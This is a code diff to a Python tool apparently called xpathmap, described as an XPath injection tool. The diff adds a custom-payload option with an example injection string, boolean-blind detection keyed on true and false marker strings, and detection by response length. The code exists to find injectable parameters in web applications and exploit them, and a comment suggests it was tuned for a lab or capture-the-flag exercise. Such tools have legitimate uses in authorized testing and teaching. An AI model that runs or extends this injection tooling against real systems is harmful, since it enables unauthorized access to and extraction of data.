@@ -244,55 +244,82 @@ def _sample(engine: Engine, param: str, payload: str, n: int = 3) -> tuple[float
 
 
 def detect_boolean(engine: Engine, params: list[str],
-                   hint_true: str, hint_false: str) -> Optional[Ctx]:
+                   hint_true: str, hint_false: str,
+                   custom_templates: list = None) -> Optional[Ctx]:
     info("  Trying: BOOLEAN-BLIND")
+
+    templates = list(BOOL_TEMPLATES)
+    if custom_templates:
+        templates = custom_templates + templates
+
     for param in params:
-        for true_tpl, false_pay in BOOL_TEMPLATES:
-            true_pay = true_tpl.replace("{COND}", "1=1")
-
-            avg_t, var_t = _sample(engine, param, true_pay)
-            avg_f, var_f = _sample(engine, param, false_pay)
-            diff = abs(avg_t - avg_f)
-            debug(f"    {param!r} avg_t={avg_t:.0f} avg_f={avg_f:.0f} diff={diff:.0f} vt={var_t} vf={var_f}")
-
-            if diff < 8 or var_t > 50 or var_f > 50:
-                continue
+        for true_tpl, false_tpl in templates:
+            true_pay  = true_tpl.replace("{COND}", "1=1")
+            false_pay = false_tpl.replace("{COND}", "1=2") if "{COND}" in false_tpl else false_tpl
 
             true_html,  _ = engine.send({param: true_pay})
             false_html, _ = engine.send({param: false_pay})
 
-            # Determine which response = TRUE
-            # Priority: user hint → keyword → length
-            if hint_true and hint_true in true_html:
-                ts, fs = hint_true, hint_false
-            elif hint_false and hint_false in false_html:
-                ts, fs = hint_true, hint_false
-            else:
-                ts = next((k for k in SUCCESS_KW if k in true_html.lower()),  "")
-                fs = next((k for k in FAILURE_KW if k in false_html.lower()), "")
+            # ── Path 1: hint strings given — check presence directly ──────────
+            # This is exactly what the official script does:
+            #   if POSITIVE_STRING in r.text: return True
+            # No length comparison needed.
+            if hint_true or hint_false:
+                in_true  = bool(hint_true  and hint_true  in true_html)
+                in_false = bool(hint_false and hint_false in false_html)
+                # Must be in TRUE response but NOT in FALSE response (or vice versa)
+                in_true_but_not_false  = in_true  and (not hint_true  or hint_true  not in false_html)
+                in_false_but_not_true  = in_false and (not hint_false or hint_false not in true_html)
 
-            # Swap if true response is actually shorter and no keyword confirmed it
-            if not ts and avg_t < avg_f:
+                debug(f"    {param!r} {true_tpl[:35]!r} in_true={in_true} in_false={in_false} "
+                      f"clean_t={in_true_but_not_false} clean_f={in_false_but_not_true}")
+
+                if in_true_but_not_false or in_false_but_not_true:
+                    pre = true_tpl.split("{COND}")[0]
+                    suf = true_tpl.split("{COND}")[1]
+                    ok(f"  [BOOLEAN] param='{param}' template={true_tpl[:40]!r}")
+                    ok(f"           true_marker={hint_true!r}  false_marker={hint_false!r}")
+                    return Ctx(
+                        technique="boolean", param=param,
+                        wrap_pre=pre, wrap_suf=suf,
+                        true_string=hint_true, false_string=hint_false,
+                        len_true=float(len(true_html)),
+                        len_false=float(len(false_html)),
+                    )
+                # This template did not match — try the next one
+                continue
+
+            # ── Path 2: no hints — use response length difference ─────────────
+            diff = abs(len(true_html) - len(false_html))
+            debug(f"    {param!r} {true_tpl[:35]!r} "
+                  f"len_t={len(true_html)} len_f={len(false_html)} diff={diff}")
+
+            if diff < 8:
+                continue
+
+            avg_t = float(len(true_html))
+            avg_f = float(len(false_html))
+            # Swap if true is shorter (wrong direction)
+            if avg_t < avg_f:
                 true_pay, false_pay = false_pay, true_pay
                 true_html, false_html = false_html, true_html
                 avg_t, avg_f = avg_f, avg_t
-                ts, fs = fs, ts
+
+            ts = next((k for k in SUCCESS_KW if k in true_html.lower()),  "")
+            fs = next((k for k in FAILURE_KW if k in false_html.lower()), "")
 
             pre = true_tpl.split("{COND}")[0]
             suf = true_tpl.split("{COND}")[1]
-
             ok(f"  [BOOLEAN] param='{param}' template={true_tpl[:40]!r}")
             ok(f"           true≈{avg_t:.0f}b  false≈{avg_f:.0f}b  marker={ts!r}")
-
             return Ctx(
                 technique="boolean", param=param,
                 wrap_pre=pre, wrap_suf=suf,
                 true_string=ts, false_string=fs,
                 len_true=avg_t, len_false=avg_f,
             )
+
     return None
-
-
 def detect_normal(engine: Engine, params: list[str]) -> Optional[Ctx]:
     info("  Trying: NORMAL (node-selection union)")
     for param in params:
@@ -337,16 +364,17 @@ def detect_time(engine: Engine, params: list[str], samples: int = 4) -> Optional
 
 
 def auto_detect(engine: Engine, params: list[str], force: Optional[str],
-                hint_true: str, hint_false: str) -> Optional[Ctx]:
+                hint_true: str, hint_false: str,
+                custom_templates: list = None) -> Optional[Ctx]:
     order = [force] if force and force != "auto" else ["normal", "boolean", "time"]
-    info(f"Auto-detecting technique (order: {' → '.join(order)})")
+    info(f"Auto-detecting technique (order: {' -> '.join(order)})")
     print()
     for tech in order:
         ctx = None
         if tech == "normal":
             ctx = detect_normal(engine, params)
         elif tech == "boolean":
-            ctx = detect_boolean(engine, params, hint_true, hint_false)
+            ctx = detect_boolean(engine, params, hint_true, hint_false, custom_templates)
         elif tech == "time":
             ctx = detect_time(engine, params)
         print()
@@ -689,15 +717,18 @@ def run_normal(engine: Engine, ctx: Ctx,
 # ─────────────────────────────────────────────────────────────────────────────
 
 def parse_args():
-    p = argparse.ArgumentParser(description="xpathmap — XPath injection tool")
+    p = argparse.ArgumentParser(description="xpathmap - XPath injection tool")
     p.add_argument("-r", "--request",       required=True)
     p.add_argument("-v", "--verbose",       action="store_true")
     p.add_argument("--technique",           choices=["auto","normal","boolean","time"], default="auto")
-    p.add_argument("--injectable-param",    default=None)
+    p.add_argument("--injectable-param",    default=None,
+                   help="Force injectable parameter name")
     p.add_argument("--true-string",         default="",
-                   help='Keyword in TRUE response, e.g. "Message successfully sent"')
+                   help='String in TRUE response, e.g. "Message successfully sent"')
     p.add_argument("--false-string",        default="",
-                   help='Keyword in FALSE response, e.g. "does not exist"')
+                   help='String in FALSE response, e.g. "User does not exist"')
+    p.add_argument("--payload",             default=None,
+                   help="Custom payload with {COND}, e.g.: asd\' or {COND} and \'1\'=\'1")
     p.add_argument("--null-payload",        default=None)
     p.add_argument("--node-param",          default=None)
     p.add_argument("--field",               default=None)
@@ -717,7 +748,6 @@ def parse_args():
     p.add_argument("--max-string-len",      type=int,   default=100)
     p.add_argument("--time-samples",        type=int,   default=4)
     return p.parse_args()
-
 
 def main():
     global VERBOSE
@@ -742,6 +772,18 @@ def main():
             0, f"{args.result_start or ''}(.+?){args.result_end or ''}"
         )
 
+    # Build custom templates from --payload
+    # User provides the TRUE template; false template is the same but with 1=2
+    custom_templates = None
+    if args.payload:
+        if "{COND}" not in args.payload:
+            err("--payload must contain {COND} placeholder, e.g.: asd' or {COND} and '1'='1")
+            sys.exit(1)
+        # Derive false payload: replace or→and, 1=1→1=2 in the static part
+        false_pay = args.payload.replace("{COND}", "1=2")
+        custom_templates = [(args.payload, false_pay)]
+        info(f"Custom payload template: {args.payload!r}")
+
     # Fully-forced normal mode context
     if (args.injectable_param and args.null_payload
             and args.technique == "normal" and args.node_param):
@@ -755,12 +797,14 @@ def main():
     else:
         force = None if args.technique == "auto" else args.technique
         ctx   = auto_detect(engine, candidates, force,
-                            args.true_string, args.false_string)
+                            args.true_string, args.false_string,
+                            custom_templates)
 
     if ctx is None:
         err("No injection detected.")
         err("Tips:")
-        err("  --technique boolean --true-string 'Message successfully sent'")
+        err("  --technique boolean --true-string \'Message successfully sent\'")
+        err("  --payload \"asd\' or {COND} and \'1\'=\'1\"")
         err("  --technique normal --injectable-param q --node-param f --field streetname")
         err("  -v  for verbose debug")
         sys.exit(1)
@@ -804,7 +848,7 @@ def main():
     if args.xml and xml_lines:
         with open(args.xml, "w") as fh:
             fh.write("\n".join(xml_lines))
-        ok(f"Saved → {args.xml}")
+        ok(f"Saved -> {args.xml}")
 
     print()
     ok("Done.")
